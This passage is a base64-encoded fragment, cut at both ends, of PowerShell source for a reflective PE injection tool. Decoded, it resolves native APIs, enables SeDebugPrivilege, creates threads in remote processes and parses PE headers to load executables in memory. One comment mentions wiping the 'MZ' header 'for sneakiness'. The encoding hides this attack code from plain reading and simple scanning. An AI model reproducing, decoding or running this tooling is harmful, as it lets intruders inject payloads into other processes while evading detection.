mV4cGxvaXQtbW9uZGF5LmNvbS8KICAgIEZ1bmN0aW9uIEdldC1Qcm9jQWRkcmVzcwogICAgewogICAgICAgIFBhcmFtCiAgICAgICAgKAogICAgICAgICAgICBbT3V0cHV0VHlwZShbSW50UHRyXSldCiAgICAgICAgCiAgICAgICAgICAgIFtQYXJhbWV0ZXIoIFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUgKV0KICAgICAgICAgICAgW1N0cmluZ10KICAgICAgICAgICAgJE1vZHVsZSwKICAgICAgICAgICAgCiAgICAgICAgICAgIFtQYXJhbWV0ZXIoIFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJFRydWUgKV0KICAgICAgICAgICAgW1N0cmluZ10KICAgICAgICAgICAgJFByb2NlZHVyZQogICAgICAgICkKCiAgICAgICAgIyBHZXQgYSByZWZlcmVuY2UgdG8gU3lzdGVtLmRsbCBpbiB0aGUgR0FDCiAgICAgICAgJFN5c3RlbUFzc2VtYmx5ID0gW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4uR2V0QXNzZW1ibGllcygpIHwKICAgICAgICAgICAgV2hlcmUtT2JqZWN0IHsgJF8uR2xvYmFsQXNzZW1ibHlDYWNoZSAtQW5kICRfLkxvY2F0aW9uLlNwbGl0KCdcXCcpWy0xXS5FcXVhbHMoJ1N5c3RlbS5kbGwnKSB9CiAgICAgICAgJFVuc2FmZU5hdGl2ZU1ldGhvZHMgPSAkU3lzdGVtQXNzZW1ibHkuR2V0VHlwZSgnTWljcm9zb2Z0LldpbjMyLlVuc2FmZU5hdGl2ZU1ldGhvZHMnKQogICAgICAgICMgR2V0IGEgcmVmZXJlbmNlIHRvIHRoZSBHZXRNb2R1bGVIYW5kbGUgYW5kIEdldFByb2NBZGRyZXNzIG1ldGhvZHMKICAgICAgICAkR2V0TW9kdWxlSGFuZGxlID0gJFVuc2FmZU5hdGl2ZU1ldGhvZHMuR2V0TWV0aG9kKCdHZXRNb2R1bGVIYW5kbGUnKQogICAgICAgICRHZXRQcm9jQWRkcmVzcyA9ICRVbnNhZmVOYXRpdmVNZXRob2RzLkdldE1ldGhvZCgnR2V0UHJvY0FkZHJlc3MnKQogICAgICAgICMgR2V0IGEgaGFuZGxlIHRvIHRoZSBtb2R1bGUgc3BlY2lmaWVkCiAgICAgICAgJEtlcm4zMkhhbmRsZSA9ICRHZXRNb2R1bGVIYW5kbGUuSW52b2tlKCRudWxsLCBAKCRNb2R1bGUpKQogICAgICAgICR0bXBQdHIgPSBOZXctT2JqZWN0IEludFB0cgogICAgICAgICRIYW5kbGVSZWYgPSBOZXctT2JqZWN0IFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5IYW5kbGVSZWYoJHRtcFB0ciwgJEtlcm4zMkhhbmRsZSkKCiAgICAgICAgIyBSZXR1cm4gdGhlIGFkZHJlc3Mgb2YgdGhlIGZ1bmN0aW9uCiAgICAgICAgV3JpdGUtT3V0cHV0ICRHZXRQcm9jQWRkcmVzcy5JbnZva2UoJG51bGwsIEAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5IYW5kbGVSZWZdJEhhbmRsZVJlZiwgJFByb2NlZHVyZSkpCiAgICB9CiAgICAKICAgIAogICAgRnVuY3Rpb24gRW5hYmxlLVNlRGVidWdQcml2aWxlZ2UKICAgIHsKICAgICAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtTeXN0ZW0uT2JqZWN0XQogICAgICAgICRXaW4zMkZ1bmN0aW9ucywKICAgICAgICAKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMiwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtTeXN0ZW0uT2JqZWN0XQogICAgICAgICRXaW4zMlR5cGVzLAogICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAzLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW1N5c3RlbS5PYmplY3RdCiAgICAgICAgJFdpbjMyQ29uc3RhbnRzCiAgICAgICAgKQogICAgICAgIAogICAgICAgIFtJbnRQdHJdJFRocmVhZEhhbmRsZSA9ICRXaW4zMkZ1bmN0aW9ucy5HZXRDdXJyZW50VGhyZWFkLkludm9rZSgpCiAgICAgICAgaWYgKCRUaHJlYWRIYW5kbGUgLWVxIFtJbnRQdHJdOjpaZXJvKQogICAgICAgIHsKICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byBnZXQgdGhlIGhhbmRsZSB0byB0aGUgY3VycmVudCB0aHJlYWQiCiAgICAgICAgfQogICAgICAgIAogICAgICAgIFtJbnRQdHJdJFRocmVhZFRva2VuID0gW0ludFB0cl06Olplcm8KICAgICAgICBbQm9vbF0kUmVzdWx0ID0gJFdpbjMyRnVuY3Rpb25zLk9wZW5UaHJlYWRUb2tlbi5JbnZva2UoJFRocmVhZEhhbmRsZSwgJFdpbjMyQ29uc3RhbnRzLlRPS0VOX1FVRVJZIC1ib3IgJFdpbjMyQ29uc3RhbnRzLlRPS0VOX0FESlVTVF9QUklWSUxFR0VTLCAkZmFsc2UsIFtSZWZdJFRocmVhZFRva2VuKQogICAgICAgIGlmICgkUmVzdWx0IC1lcSAkZmFsc2UpCiAgICAgICAgewogICAgICAgICAgICAkRXJyb3JDb2RlID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0TGFzdFdpbjMyRXJyb3IoKQogICAgICAgICAgICBpZiAoJEVycm9yQ29kZSAtZXEgJFdpbjMyQ29uc3RhbnRzLkVSUk9SX05PX1RPS0VOKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkUmVzdWx0ID0gJFdpbjMyRnVuY3Rpb25zLkltcGVyc29uYXRlU2VsZi5JbnZva2UoMykKICAgICAgICAgICAgICAgIGlmICgkUmVzdWx0IC1lcSAkZmFsc2UpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byBpbXBlcnNvbmF0ZSBzZWxmIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAkUmVzdWx0ID0gJFdpbjMyRnVuY3Rpb25zLk9wZW5UaHJlYWRUb2tlbi5JbnZva2UoJFRocmVhZEhhbmRsZSwgJFdpbjMyQ29uc3RhbnRzLlRPS0VOX1FVRVJZIC1ib3IgJFdpbjMyQ29uc3RhbnRzLlRPS0VOX0FESlVTVF9QUklWSUxFR0VTLCAkZmFsc2UsIFtSZWZdJFRocmVhZFRva2VuKQogICAgICAgICAgICAgICAgaWYgKCRSZXN1bHQgLWVxICRmYWxzZSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBUaHJvdyAiVW5hYmxlIHRvIE9wZW5UaHJlYWRUb2tlbi4iCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBUaHJvdyAiVW5hYmxlIHRvIE9wZW5UaHJlYWRUb2tlbi4gRXJyb3IgY29kZTogJEVycm9yQ29kZSIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAKICAgICAgICBbSW50UHRyXSRQTHVpZCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkFsbG9jSEdsb2JhbChbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoW1R5cGVdJFdpbjMyVHlwZXMuTFVJRCkpCiAgICAgICAgJFJlc3VsdCA9ICRXaW4zMkZ1bmN0aW9ucy5Mb29rdXBQcml2aWxlZ2VWYWx1ZS5JbnZva2UoJG51bGwsICJTZURlYnVnUHJpdmlsZWdlIiwgJFBMdWlkKQogICAgICAgIGlmICgkUmVzdWx0IC1lcSAkZmFsc2UpCiAgICAgICAgewogICAgICAgICAgICBUaHJvdyAiVW5hYmxlIHRvIGNhbGwgTG9va3VwUHJpdmlsZWdlVmFsdWUiCiAgICAgICAgfQoKICAgICAgICBbVUludDMyXSRUb2tlblByaXZTaXplID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXSRXaW4zMlR5cGVzLlRPS0VOX1BSSVZJTEVHRVMpCiAgICAgICAgW0ludFB0cl0kVG9rZW5Qcml2aWxlZ2VzTWVtID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6QWxsb2NIR2xvYmFsKCRUb2tlblByaXZTaXplKQogICAgICAgICRUb2tlblByaXZpbGVnZXMgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cnVjdHVyZSgkVG9rZW5Qcml2aWxlZ2VzTWVtLCBbVHlwZV0kV2luMzJUeXBlcy5UT0tFTl9QUklWSUxFR0VTKQogICAgICAgICRUb2tlblByaXZpbGVnZXMuUHJpdmlsZWdlQ291bnQgPSAxCiAgICAgICAgJFRva2VuUHJpdmlsZWdlcy5Qcml2aWxlZ2VzLkx1aWQgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cnVjdHVyZSgkUEx1aWQsIFtUeXBlXSRXaW4zMlR5cGVzLkxVSUQpCiAgICAgICAgJFRva2VuUHJpdmlsZWdlcy5Qcml2aWxlZ2VzLkF0dHJpYnV0ZXMgPSAkV2luMzJDb25zdGFudHMuU0VfUFJJVklMRUdFX0VOQUJMRUQKICAgICAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTdHJ1Y3R1cmVUb1B0cigkVG9rZW5Qcml2aWxlZ2VzLCAkVG9rZW5Qcml2aWxlZ2VzTWVtLCAkdHJ1ZSkKCiAgICAgICAgJFJlc3VsdCA9ICRXaW4zMkZ1bmN0aW9ucy5BZGp1c3RUb2tlblByaXZpbGVnZXMuSW52b2tlKCRUaHJlYWRUb2tlbiwgJGZhbHNlLCAkVG9rZW5Qcml2aWxlZ2VzTWVtLCAkVG9rZW5Qcml2U2l6ZSwgW0ludFB0cl06Olplcm8sIFtJbnRQdHJdOjpaZXJvKQogICAgICAgICRFcnJvckNvZGUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXRMYXN0V2luMzJFcnJvcigpICNOZWVkIHRoaXMgdG8gZ2V0IHN1Y2Nlc3MgdmFsdWUgb3IgZmFpbHVyZSB2YWx1ZQogICAgICAgIGlmICgoJFJlc3VsdCAtZXEgJGZhbHNlKSAtb3IgKCRFcnJvckNvZGUgLW5lIDApKQogICAgICAgIHsKICAgICAgICAgICAgI1Rocm93ICJVbmFibGUgdG8gY2FsbCBBZGp1c3RUb2tlblByaXZpbGVnZXMuIFJldHVybiB2YWx1ZTogJFJlc3VsdCwgRXJyb3Jjb2RlOiAkRXJyb3JDb2RlIiAgICN0b2RvIG5lZWQgdG8gZGV0ZWN0IGlmIGFscmVhZHkgc2V0CiAgICAgICAgfQogICAgICAgIAogICAgICAgIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkZyZWVIR2xvYmFsKCRUb2tlblByaXZpbGVnZXNNZW0pCiAgICB9CiAgICAKICAgIAogICAgRnVuY3Rpb24gQ3JlYXRlLVJlbW90ZVRocmVhZAogICAgewogICAgICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW0ludFB0cl0KICAgICAgICAkUHJvY2Vzc0hhbmRsZSwKICAgICAgICAKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMiwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtJbnRQdHJdCiAgICAgICAgJFN0YXJ0QWRkcmVzcywKICAgICAgICAKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMywgTWFuZGF0b3J5ID0gJGZhbHNlKV0KICAgICAgICBbSW50UHRyXQogICAgICAgICRBcmd1bWVudFB0ciA9IFtJbnRQdHJdOjpaZXJvLAogICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSA0LCBNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW1N5c3RlbS5PYmplY3RdCiAgICAgICAgJFdpbjMyRnVuY3Rpb25zCiAgICAgICAgKQogICAgICAgIAogICAgICAgIFtJbnRQdHJdJFJlbW90ZVRocmVhZEhhbmRsZSA9IFtJbnRQdHJdOjpaZXJvCiAgICAgICAgCiAgICAgICAgJE9TVmVyc2lvbiA9IFtFbnZpcm9ubWVudF06Ok9TVmVyc2lvbi5WZXJzaW9uCiAgICAgICAgI1Zpc3RhIGFuZCBXaW43CiAgICAgICAgaWYgKCgkT1NWZXJzaW9uIC1nZSAoTmV3LU9iamVjdCAnVmVyc2lvbicgNiwwKSkgLWFuZCAoJE9TVmVyc2lvbiAtbHQgKE5ldy1PYmplY3QgJ1ZlcnNpb24nIDYsMikpKQogICAgICAgIHsKICAgICAgICAgICAgI1dyaXRlLVZlcmJvc2UgIldpbmRvd3MgVmlzdGEvNyBkZXRlY3RlZCwgdXNpbmcgTnRDcmVhdGVUaHJlYWRFeC4gQWRkcmVzcyBvZiB0aHJlYWQ6ICRTdGFydEFkZHJlc3MiCiAgICAgICAgICAgICRSZXRWYWw9ICRXaW4zMkZ1bmN0aW9ucy5OdENyZWF0ZVRocmVhZEV4Lkludm9rZShbUmVmXSRSZW1vdGVUaHJlYWRIYW5kbGUsIDB4MUZGRkZGLCBbSW50UHRyXTo6WmVybywgJFByb2Nlc3NIYW5kbGUsICRTdGFydEFkZHJlc3MsICRBcmd1bWVudFB0ciwgJGZhbHNlLCAwLCAweGZmZmYsIDB4ZmZmZiwgW0ludFB0cl06Olplcm8pCiAgICAgICAgICAgICRMYXN0RXJyb3IgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXRMYXN0V2luMzJFcnJvcigpCiAgICAgICAgICAgIGlmICgkUmVtb3RlVGhyZWFkSGFuZGxlIC1lcSBbSW50UHRyXTo6WmVybykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgVGhyb3cgIkVycm9yIGluIE50Q3JlYXRlVGhyZWFkRXguIFJldHVybiB2YWx1ZTogJFJldFZhbC4gTGFzdEVycm9yOiAkTGFzdEVycm9yIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgICNYUC9XaW44CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgI1dyaXRlLVZlcmJvc2UgIldpbmRvd3MgWFAvOCBkZXRlY3RlZCwgdXNpbmcgQ3JlYXRlUmVtb3RlVGhyZWFkLiBBZGRyZXNzIG9mIHRocmVhZDogJFN0YXJ0QWRkcmVzcyIKICAgICAgICAgICAgJFJlbW90ZVRocmVhZEhhbmRsZSA9ICRXaW4zMkZ1bmN0aW9ucy5DcmVhdGVSZW1vdGVUaHJlYWQuSW52b2tlKCRQcm9jZXNzSGFuZGxlLCBbSW50UHRyXTo6WmVybywgW1VJbnRQdHJdW1VJbnQ2NF0weEZGRkYsICRTdGFydEFkZHJlc3MsICRBcmd1bWVudFB0ciwgMCwgW0ludFB0cl06Olplcm8pCiAgICAgICAgfQogICAgICAgIAogICAgICAgIGlmICgkUmVtb3RlVGhyZWFkSGFuZGxlIC1lcSBbSW50UHRyXTo6WmVybykKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLUVycm9yICJFcnJvciBjcmVhdGluZyByZW1vdGUgdGhyZWFkLCB0aHJlYWQgaGFuZGxlIGlzIG51bGwiIC1FcnJvckFjdGlvbiBTdG9wCiAgICAgICAgfQogICAgICAgIAogICAgICAgIHJldHVybiAkUmVtb3RlVGhyZWFkSGFuZGxlCiAgICB9CgogICAgCgogICAgRnVuY3Rpb24gR2V0LUltYWdlTnRIZWFkZXJzCiAgICB7CiAgICAgICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbSW50UHRyXQogICAgICAgICRQRUhhbmRsZSwKICAgICAgICAKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtTeXN0ZW0uT2JqZWN0XQogICAgICAgICRXaW4zMlR5cGVzCiAgICAgICAgKQogICAgICAgIAogICAgICAgICROdEhlYWRlcnNJbmZvID0gTmV3LU9iamVjdCBTeXN0ZW0uT2JqZWN0CiAgICAgICAgCiAgICAgICAgI05vcm1hbGx5IHdvdWxkIHZhbGlkYXRlIERPU0hlYWRlciBoZXJlLCBidXQgd2UgZGlkIGl0IGJlZm9yZSB0aGlzIGZ1bmN0aW9uIHdhcyBjYWxsZWQgYW5kIHRoZW4gZGVzdHJveWVkICdNWicgZm9yIHNuZWFraW5lc3MKICAgICAgICAkZG9zSGVhZGVyID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJFBFSGFuZGxlLCBbVHlwZV0kV2luMzJUeXBlcy5JTUFHRV9ET1NfSEVBREVSKQoKICAgICAgICAjR2V0IElNQUdFX05UX0hFQURFUlMKICAgICAgICBbSW50UHRyXSROdEhlYWRlcnNQdHIgPSBbSW50UHRyXShBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoW0ludDY0XSRQRUhhbmRsZSkgKFtJbnQ2NF1bVUludDY0XSRkb3NIZWFkZXIuZV9sZmFuZXcpKQogICAgICAgICROdEhlYWRlcnNJbmZvIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgTnRIZWFkZXJzUHRyIC1WYWx1ZSAkTnRIZWFkZXJzUHRyCiAgICAgICAgJGltYWdlTnRIZWFkZXJzNjQgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cnVjdHVyZSgkTnRIZWFkZXJzUHRyLCBbVHlwZV0kV2luMzJUeXBlcy5JTUFHRV9OVF9IRUFERVJTNjQpCiAgICAgICAgCiAgICAgICAgI01ha2Ugc3VyZSB0aGUgSU1BR0VfTlRfSEVBREVSUyBjaGVja3Mgb3V0LiBJZiBpdCBkb2Vzbid0LCB0aGUgZGF0YSBzdHJ1Y3R1cmUgaXMgaW52YWxpZC4gVGhpcyBzaG91bGQgbmV2ZXIgaGFwcGVuLgogICAgICAgIGlmICgkaW1hZ2VOdEhlYWRlcnM2NC5TaWduYXR1cmUgLW5lIDB4MDAwMDQ1NTApCiAgICAgICAgewogICAgICAgICAgICB0aHJvdyAiSW52YWxpZCBJTUFHRV9OVF9IRUFERVIgc2lnbmF0dXJlLiIKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgaWYgKCRpbWFnZU50SGVhZGVyczY0Lk9wdGlvbmFsSGVhZGVyLk1hZ2ljIC1lcSAnSU1BR0VfTlRfT1BUSU9OQUxfSERSNjRfTUFHSUMnKQogICAgICAgIHsKICAgICAgICAgICAgJE50SGVhZGVyc0luZm8gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJTUFHRV9OVF9IRUFERVJTIC1WYWx1ZSAkaW1hZ2VOdEhlYWRlcnM2NAogICAgICAgICAgICAkTnRIZWFkZXJzSW5mbyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIFBFNjRCaXQgLVZhbHVlICR0cnVlCiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgICRJbWFnZU50SGVhZGVyczMyID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJE50SGVhZGVyc1B0ciwgW1R5cGVdJFdpbjMyVHlwZXMuSU1BR0VfTlRfSEVBREVSUzMyKQogICAgICAgICAgICAkTnRIZWFkZXJzSW5mbyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIElNQUdFX05UX0hFQURFUlMgLVZhbHVlICRpbWFnZU50SGVhZGVyczMyCiAgICAgICAgICAgICROdEhlYWRlcnNJbmZvIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgUEU2NEJpdCAtVmFsdWUgJGZhbHNlCiAgICAgICAgfQogICAgICAgIAogICAgICAgIHJldHVybiAkTnRIZWFkZXJzSW5mbwogICAgfQoKCiAgICAjVGhpcyBmdW5jdGlvbiB3aWxsIGdldCB0aGUgaW5mb3JtYXRpb24gbmVlZGVkIHRvIGFsbG9jYXRlZCBzcGFjZSBpbiBtZW1vcnkgZm9yIHRoZSBQRQogICAgRnVuY3Rpb24gR2V0LVBFQmFzaWNJbmZvCiAgICB7CiAgICAgICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlciggUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkdHJ1ZSApXQogICAgICAgIFtCeXRlW11dCiAgICAgICAgJFBFQnl0ZXMsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbU3lzdGVtLk9iamVjdF0KICAgICAgICAkV2luMzJUeXBlcwogICAgICAgICkKICAgICAgICAKICAgICAgICAkUEVJbmZvID0gTmV3LU9iamVjdCBTeXN0ZW0uT2JqZWN0CiAgICAgICAgCiAgICAgICAgI1dyaXRlIHRoZSBQRSB0byBtZW1vcnkgdGVtcG9yYXJpbHkgc28gSSBjYW4gZ2V0IGluZm9ybWF0aW9uIGZyb20gaXQuIFRoaXMgaXMgbm90IGl0J3MgZmluYWwgcmVzdGluZyBzcG90LgogICAgICAgIFtJbnRQdHJdJFVubWFuYWdlZFBFQnl0ZXMgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpBbGxvY0hHbG9iYWwoJFBFQnl0ZXMuTGVuZ3RoKQogICAgICAgIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkNvcHkoJFBFQnl0ZXMsIDAsICRVbm1hbmFnZWRQRUJ5dGVzLCAkUEVCeXRlcy5MZW5ndGgpIHwgT3V0LU51bGwKICAgICAgICAKICAgICAgICAjR2V0IE50SGVhZGVyc0luZm8KICAgICAgICAkTnRIZWFkZXJzSW5mbyA9IEdldC1JbWFnZU50SGVhZGVycyAtUEVIYW5kbGUgJFVubWFuYWdlZFBFQnl0ZXMgLVdpbjMyVHlwZXMgJFdpbjMyVHlwZXMKICAgICAgICAKICAgICAgICAjQnVpbGQgYSBzdHJ1Y3R1cmUgd2l0aCB0aGUgaW5mb3JtYXRpb24gd2hpY2ggd2lsbCBiZSBuZWVkZWQgZm9yIGFsbG9jYXRpbmcgbWVtb3J5IGFuZCB3cml0aW5nIHRoZSBQRSB0byBtZW1vcnkKICAgICAgICAkUEVJbmZvIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgJ1BFNjRCaXQnIC1WYWx1ZSAoJE50SGVhZGVyc0luZm8uUEU2NEJpdCkKICAgICAgICAkUEVJbmZvIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgJ09yaWdpbmFsSW1hZ2VCYXNlJyAtVmFsdWUgKCROdEhlYWRlcnNJbmZvLklNQUdFX05UX0hFQURFUlMuT3B0aW9uYWxIZWFkZXIuSW1hZ2VCYXNlKQogICAgICAgICRQRUluZm8gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAnU2l6ZU9mSW1hZ2UnIC1WYWx1ZSAoJE50SGVhZGVyc0luZm8uSU1BR0VfTlRfSEVBREVSUy5PcHRpb25hbEhlYWRlci5TaXplT2ZJbWFnZSkKICAgICAgICAkUEVJbmZvIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgJ1NpemVPZkhlYWRlcnMnIC1WYWx1ZSAoJE50SGVhZGVyc0luZm8uSU1BR0VfTlRfSEVBREVSUy5PcHRpb25hbEhlYWRlci5TaXplT2ZIZWFkZXJzKQogICAgICAgICRQRUluZm8gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAnRGxsQ2hhcmFjdGVyaXN0aWNzJyAtVmFsdWUgKCROdEhlYWRlcnNJbmZvLklNQUdFX05UX0hFQURFUlMuT3B0aW9uYWxIZWFkZXIuRGxsQ2hhcmFjdGVyaXN0aWNzKQogICAgICAgIAogICAgICAgICNGcmVlIHRoZSBtZW1vcnkgYWxsb2NhdGVkIGFib3ZlLCB0aGlzIGlzbid0IHdoZXJlIHdlIGFsbG9jYXRlIHRoZSBQRSB0byBtZW1vcnkKICAgICAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpGcmVlSEdsb2JhbCgkVW5tYW5hZ2VkUEVCeXRlcykKICAgICAgICAKICAgICAgICByZXR1cm4gJFBFSW5mbwogICAgfQoKCiAgICAjUEVJbmZvIG11c3QgY29udGFpbiB0aGUgZm9sbG93aW5nIE5vdGVQcm9wZXJ0aWVzOgogICAgIyAgIFBFSGFuZGxlOiBBbiBJbnRQdHIgdG8gdGhlIGFkZHJlc3MgdGhlIFBFIGlzIGxvYWRlZCB0byBpbiBtZW1vcnkKICAgIEZ1bmN0aW9uIEdldC1QRURldGFpbGVkSW5mbwogICAgewogICAgICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoIFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtJbnRQdHJdCiAgICAgICAgJFBFSGFuZGxlLAogICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW1N5c3RlbS5PYmplY3RdCiAgICAgICAgJFdpbjMyVHlwZXMsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDIsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbU3lzdGVtLk9iamVjdF0KICAgICAgICAkV2luMzJDb25zdGFudHMKICAgICAgICApCiAgICAgICAgCiAgICAgICAgaWYgKCRQRUhhbmRsZSAtZXEgJG51bGwgLW9yICRQRUhhbmRsZSAtZXEgW0ludFB0cl06Olplcm8pCiAgICAgICAgewogICAgICAgICAgICB0aHJvdyAnUEVIYW5kbGUgaXMgbnVsbCBvciBJbnRQdHIuWmVybycKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgJFBFSW5mbyA9IE5ldy1PYmplY3QgU3lzdGVtLk9iamVjdAogICAgICAgIAogICAgICAgICNHZXQgTnRIZWFkZXJzIGluZm9ybWF0aW9uCiAgICAgICAgJE50SGVhZGVyc0luZm8gPSBHZXQtSW1hZ2VOdEhlYWRlcnMgLVBFSGFuZGxlICRQRUhhbmRsZSAtV2luMzJUeXBlcyAkV2luMzJUeXBlcwogICAgICAgIAogICAgICAgICNCdWlsZCB0aGUgUEVJbmZvIG9iamVjdAogICAgICAgICRQRUluZm8gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBQRUhhbmRsZSAtVmFsdWUgJFBFSGFuZGxlCiAgICAgICAgJFBFSW5mbyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIElNQUdFX05UX0hFQURFUlMgLVZhbHVlICgkTnRIZWFkZXJzSW5mby5JTUFHRV9OVF9IRUFERVJTKQogICAgICAgICRQRUluZm8gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBOdEhlYWRlcnNQdHIgLVZhbHVlICgkTnRIZWFkZXJzSW5mby5OdEhlYWRlcnNQdHIpCiAgICAgICAgJFBFSW5mbyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIFBFNjRCaXQgLVZhbHVlICgkTnRIZWFkZXJzSW5mby5QRTY0Qml0KQogICAgICAgICRQRUluZm8gfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAnU2l6ZU9mSW1hZ2UnIC1WYWx1ZSAoJE50SGVhZGVyc0luZm8uSU1BR0VfTlRfSEVBREVSUy5PcHRpb25hbEhlYWRlci5TaXplT2ZJbWFnZSkKICAgICAgICAKICAgICAgICBpZiAoJFBFSW5mby5QRTY0Qml0IC1lcSAkdHJ1ZSkKICAg